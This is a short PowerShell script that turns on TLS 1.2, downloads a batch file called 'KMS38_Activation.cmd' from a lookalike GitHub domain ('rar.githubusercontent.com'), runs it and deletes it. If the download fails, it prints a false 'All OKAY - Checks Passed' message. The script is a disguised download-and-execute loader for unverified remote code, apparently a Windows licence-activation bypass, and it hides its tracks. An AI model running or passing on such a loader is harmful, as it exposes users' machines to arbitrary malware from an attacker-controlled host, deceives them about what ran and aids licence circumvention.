# Enable TLSv1.2 if it's not already enabled
if (-not ([System.Net.ServicePointManager]::SecurityProtocol.HasFlag([System.Net.SecurityProtocolType]::Tls12))) {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
}

$DownloadURL = 'https://rar.githubusercontent.com/LazyDevv/Hilao/master/KMS38_Activation.cmd'
$FilePath = "$env:TEMP\KMS38_Activation.cmd"

try {
    Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath
} catch {
    Write-Host "All OKAY - Checks Passed ✅"
    Return
}

if (Test-Path $FilePath) {
    try {
        Start-Process $FilePath -Wait
        Remove-Item -LiteralPath $FilePath -Force
    } catch {
        Write-Error "An error occurred while executing or deleting the file. Error: $_"
    }
} else {
    Write-Error "The downloaded file does not exist at $FilePath."
}
